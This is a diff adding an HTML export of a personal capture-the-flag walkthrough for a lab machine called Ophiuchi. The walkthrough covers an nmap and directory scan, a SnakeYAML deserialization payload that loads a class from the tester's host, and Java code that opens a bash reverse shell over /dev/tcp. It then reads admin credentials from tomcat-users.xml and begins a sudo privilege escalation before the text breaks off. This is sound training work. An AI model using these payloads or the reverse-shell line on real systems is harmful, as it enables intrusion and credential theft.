@@ -1,0 +1,695 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Ophiuchi</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+.select-value-color-default { background-color: rgba(206,205,202,0.5); }
+.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
+.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
+.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
+.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
+.select-value-color-green { background-color: rgba(0,135,107,0.2); }
+.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
+.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
+.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
+.select-value-color-red { background-color: rgba(255,0,26,0.2); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="fb772b1c-ee54-4771-8d17-da0c1b26b8fe" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">🎯</span></div><h1 class="page-title">Ophiuchi</h1></header><div class="page-body"><p id="268f67a9-e574-4aa1-9812-c792f3d76ec8" class="">Starting with nmap scan:</p><pre id="8804e073-668d-47a2-85fa-82916538c5c0" class="code"><code># Nmap 7.91 scan initiated Wed May  5 14:20:22 2021 as: nmap -Pn -sV -A -oA scan-output -vv 10.10.10.227
+Nmap scan report for 10.10.10.227
+Host is up, received user-set (0.19s latency).
+Scanned at 2021-05-05 14:20:23 EDT for 25s
+Not shown: 998 closed ports
+Reason: 998 conn-refused
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpzM/GEYunOwIMB+FyQCnOaYRK1DYv8e0+VI3Zy7LnY157q+3SITc
+|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM79V2Ts2us0NxZA7nn
+|   256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO31s/C33kbuzZl9ohJWVEmLsW9aqObU6ZjlpbOQJt0C
+8080/tcp open  http    syn-ack Apache Tomcat 9.0.38
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Parse YAML
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed May  5 14:20:48 2021 -- 1 IP address (1 host up) scanned in 26.02 seconds</code></pre><p id="9b348689-3f20-483c-9a56-69fd27cc59f1" class="">Gobuster directories scan: </p><pre id="e6bea2eb-36b3-4458-97a4-8851967920ba" class="code"><code>└─$ gobuster dir -u http://10.10.10.227:8080/ -w /usr/share/dirb/wordlists/common.txt                            
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.227:8080/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/05/05 14:25:01 Starting gobuster in directory enumeration mode
+===============================================================
+/host-manager         (Status: 302) [Size: 0] [--&gt; /host-manager/]
+/manager              (Status: 302) [Size: 0] [--&gt; /manager/]     
+/Servlet              (Status: 200) [Size: 0]                     
+/test                 (Status: 302) [Size: 0] [--&gt; /test/]        
+                                                                  
+===============================================================
+2021/05/05 14:26:33 Finished
+===============================================================</code></pre><figure id="125c8174-55a0-4fd0-8e74-6417af45bd1b" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled.png"><img style="width:751px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled.png"/></a></figure><p id="28a76005-a876-4237-b5ba-5a71b862317c" class="">In 8080 port we have online YAML parser = <a href="http://10.10.10.227:8080/index.jsp">http://10.10.10.227:8080/index.jsp</a></p><figure id="84b4da39-ae4a-4c2a-b5f1-54a4d88e4951" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%201.png"><img style="width:1870px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%201.png"/></a></figure><p id="8fcb3903-978e-4c3c-a661-3fcb54842b38" class="">In host-manager ask for login</p><figure id="d3c96293-aebf-402e-ad2c-2b453076b4bd" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%202.png"><img style="width:967px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%202.png"/></a></figure><p id="c3bf9fea-5e16-41e4-8693-425c6fb7624b" class="">Stopping login says : </p><figure id="de07ba8e-c9aa-4324-a0a2-199a49ad4b8e" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%203.png"><img style="width:958px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%203.png"/></a></figure><p id="2d655460-2247-4e7d-b15d-97cd0a95c4ac" class="">manager ask for login too</p><figure id="9825eece-3b4a-4d11-953e-7c8198304b40" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%204.png"><img style="width:956px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%204.png"/></a></figure><p id="0a14ee59-8890-407b-9dae-bf57a88b662c" class="">/servlet - ISs a blank page</p><figure id="322653d3-92ef-4eed-9a4b-195b86cd262d" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%205.png"><img style="width:958px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%205.png"/></a></figure><p id="9f6911eb-fceb-4669-a688-c615fc34769c" class="">The YAML parser have a CVE called insecure deserialization, and in this article shows how to exploit it.</p><p id="c189c0e9-19c5-4e6d-abd7-433bb632e7a4" class=""><a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858</a></p><p id="e7eeff32-dfb8-482c-8ec4-117f32236a0b" class="">Github about YAML Payload : <a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p id="5dfa87e6-d0bf-4b0d-9a4a-6d4029810351" class="">I note that the Parse YAML java payload returns in my server a response.</p><pre id="289f8535-a917-4e5b-833c-e92796ab617b" class="code"><code>!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL [&quot;http://10.10.14.185/&quot;]
+  ]]
+]</code></pre><figure id="cab9a1ae-5f5b-44ed-b689-d9e3a7cf3012" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%206.png"><img style="width:1345px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%206.png"/></a></figure><h3 id="f9914d8e-47af-4382-9ed2-104ce26feb56" class="">More examples of deserialization :</h3><p id="7c4287d6-21da-4e45-8ddf-364e089c6fbf" class=""><a href="https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html">https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html</a></p><p id="0beae14f-60e0-43e2-b89f-d4ddbcb45218" class=""><a href="https://www.youtube.com/watch?v=GjwduwSltNU&amp;ab_channel=JohnHammond">https://www.youtube.com/watch?v=GjwduwSltNU&amp;ab_channel=JohnHammond</a></p><figure id="5cabefed-84c1-463d-9e38-0314bd2f7102" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%207.png"><img style="width:1668px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%207.png"/></a></figure><figure id="78caae7d-e162-4756-b8f3-2eba57912bb0" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%208.png"><img style="width:1175px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%208.png"/></a></figure><p id="f6d31bca-9703-4b71-b812-c19a74ac8c2e" class=""><a href="https://www.programmersought.com/article/15966770260/">https://www.programmersought.com/article/15966770260/</a></p><p id="4cb83197-0c29-43b7-a296-96f17b90a654" class="">I tried a lot of payloads and i saw this :</p><pre id="77e9ab3d-df5d-42af-bcf1-57daf4a4a4d5" class="code"><code>public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
+
+    public AwesomeScriptEngineFactory() {
+	String [] cmd={&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.185/3332 0&gt;&amp;1&quot;};
+    	String [] jex={&quot;bash&quot;,&quot;-c&quot;,&quot;{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}&quot;};
+        try {
+            Runtime.getRuntime().exec(cmd);
+	    Runtime.getRuntime().exec(jex);
+	    Runtime.getRuntime().exec(&quot;echo $jex&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }</code></pre><p id="e3ba7851-4aba-4c24-84ee-3d3609c25a5d" class="">After many attempts I get a shell, to do this I created another VM using ParrotOS, probably my kali Linux had a some problem related to java compilation.</p><p id="f84e2e32-0603-470a-9ef6-797fbebc9320" class="">Working perfectly and getting the tomcat user.</p><figure id="2673816b-674a-426c-87b1-185d89337220" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%209.png"><img style="width:1907px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%209.png"/></a></figure><p id="9a475a56-fb4e-4cc3-9c59-09979c2d83a7" class="">Exploring the machine in the <mark class="highlight-blue">/opt/tomcat/conf  </mark>directory have interesting file called tomcat-users.xml and in it is stored the administrator password.</p><figure id="f0f646aa-06f4-4577-8a4c-1d0e4a2c30ba" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2010.png"><img style="width:890px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2010.png"/></a></figure><p id="82b462f6-4a8f-4808-ae42-b7d07c0424da" class="">Login in user with command :<mark class="highlight-blue"> su admin</mark></p><p id="657b7fc5-a53f-4334-b1e7-d93dc84e72fe" class="">Successful, getting the first FLAG!!!</p><figure id="3893c4a4-7183-4a3e-8030-3c41c5b7ddc4" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2011.png"><img style="width:715px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2011.png"/></a></figure><p id="5ac0d40f-2acc-4f10-9fec-43f8944db720" class="">To facility our process make shell full interactive:</p><pre id="fab24b45-f6c1-487e-8e0c-d930098e525a" class="code"><code>python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;
+press CTRL + z
+type : stty raw -echo;fg
+press ENTER </code></pre><figure id="21bfc4f3-8870-4fbc-9422-0819b51e4899" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2012.png"><img style="width:1212px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2012.png"/></a></figure><pre id="5b2335fe-1692-4a6c-8dce-42816b4f1248" class="code"><code>sudo -l</code></pre><p id="06e284ea-d7b1-4cd1-832d-5dcf7469897c" class="">PATH<mark class="highlight-blue"> /opt/wasm-functions/index.go</mark></p><p id="867447e5-3ba8-4dbd-949e-b605978c22c8" class="">Reading the code we look that <mark class="highlight-blue">index.go </mark>executes /bin/bash and <a href="http://deploy.sh">deploy.sh</a> localized in wasm-functions and it read <mark class="highlight-blue">main.wasm</mark></p><h3 id="adc00fa7-3db4-49e3-9a7c-bc6445d791be" class="">ARTICLES:</h3><p id="e87f0750-8144-4879-830f-4eb7af126628" class=""><a href="https://www.reddit.com/r/golang/comments/jaqypa/machine_a_zero_dependency_library_for_managed/">https://www.reddit.com/r/golang/comments/jaqypa/machine_a_zero_dependency_library_for_managed/</a></p><p id="f205e20a-1e4a-4107-a58a-ceadd5c189ed" class=""><a href="https://blog.charmes.net/post/privileged-listen-golang/">https://blog.charmes.net/post/privileged-listen-golang/</a></p><p id="9992aefd-b152-4677-bf98-853a2935b08b" class=""><a href="https://github.com/golang/go/issues/1435">https://github.com/golang/go/issues/1435</a></p><p id="133b87db-e300-402b-9376-9a38d5ad9a7d" class=""><a href="https://medium.com/trainingcenter/goroutines-e-go-channels-f019784d6855">https://medium.com/trainingcenter/goroutines-e-go-channels-f019784d6855</a></p><p id="747e77d3-6e85-413b-95d9-ef4258328ff7" class=""><a href="https://gobyexample.com/goroutines">https://gobyexample.com/goroutines</a></p><p id="c27e2e6f-3af4-43c0-8b72-c1830cc675c8" class=""><a href="http://goporexemplo.golangbr.org/goroutines.html">http://goporexemplo.golangbr.org/goroutines.html</a></p><p id="c1e58bb4-52d2-47d1-aa29-3bc2af98dfcc" class=""><a href="https://stackoverflow.com/questions/42934606/tomcat-or-root-password-in-azure-bitnami">https://stackoverflow.com/questions/42934606/tomcat-or-root-password-in-azure-bitnami</a></p><p id="85809b1a-8e9f-469d-a554-ce21e8e28e7d" class=""><a href="https://www.reddit.com/r/golang/comments/jaqypa/machine_a_zero_dependency_library_for_managed/">https://www.reddit.com/r/golang/comments/jaqypa/machine_a_zero_dependency_library_for_managed/</a></p><p id="292d6c6e-a4ad-4bf2-b333-5a9fc0d31b43" class="">Note that<mark class="highlight-blue"> f ≠ &quot;1&quot;</mark> return<mark class="highlight-blue"> &quot;Not ready to deploy&quot;</mark>, if we change this ?</p><figure id="efadba61-04d4-4a4f-af23-244608e5cf9c" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2013.png"><img style="width:779px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2013.png"/></a></figure><p id="712fc3bd-f805-43f7-ba98-a408235ed940" class="">Copy the main.wasm to /tm</p><figure id="ecfd1c3c-ba60-42a1-863f-34ad684d0e46" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2014.png"><img style="width:715px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2014.png"/></a></figure><figure id="e809437c-ec7b-4367-aacb-c4431a62b76c" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2015.png"><img style="width:874px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2015.png"/></a></figure><p id="fd23dcf9-bb54-48b1-83e0-6182bc9c4d01" class="">Let&#x27;s try read main.wasm in our computer.</p><p id="332e6307-c7df-49a2-abe7-2207ce6653fd" class=""><a href="https://github.com/WebAssembly/wabt">https://github.com/WebAssembly/wabt</a></p><figure id="089c60ac-12fe-4ad3-98ea-bd0a2327c173" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2016.png"><img style="width:1546px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2016.png"/></a></figure><figure id="3c06e829-9ca8-41e7-b5c3-662b80b73810" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2017.png"><img style="width:1442px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2017.png"/></a></figure><p id="85156d6b-d0a7-4901-9855-8abef4f8b1d5" class="">Download the wat2wasm </p><pre id="ca588a38-9888-4a8a-9691-fe14e58d032a" class="code"><code>apt-get install wabt</code></pre><figure id="8722827b-e4e1-4441-9ef1-6d7b0654635c" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2018.png"><img style="width:843px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2018.png"/></a></figure><p id="be918e0f-df7a-474a-a89f-fa241b720528" class="">Try with  wat2wasm and install cmake.</p><figure id="c44af5c9-90af-4eea-a225-64435d28cba7" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2019.png"><img style="width:726px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2019.png"/></a></figure><p id="a387d31e-5106-4add-ba76-8db1fb02efea" class="">Convert the main.wasm to main.wat</p><figure id="f92b0a87-ba33-4819-a631-d7dfcc229af9" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2020.png"><img style="width:1443px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2020.png"/></a></figure><p id="f18cf129-f60a-4132-b64e-7fed1237b9a1" class="">Change the func $info to 1:</p><figure id="263c7da7-41a1-435f-b4f1-57c44343134c" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2021.png"><img style="width:629px" 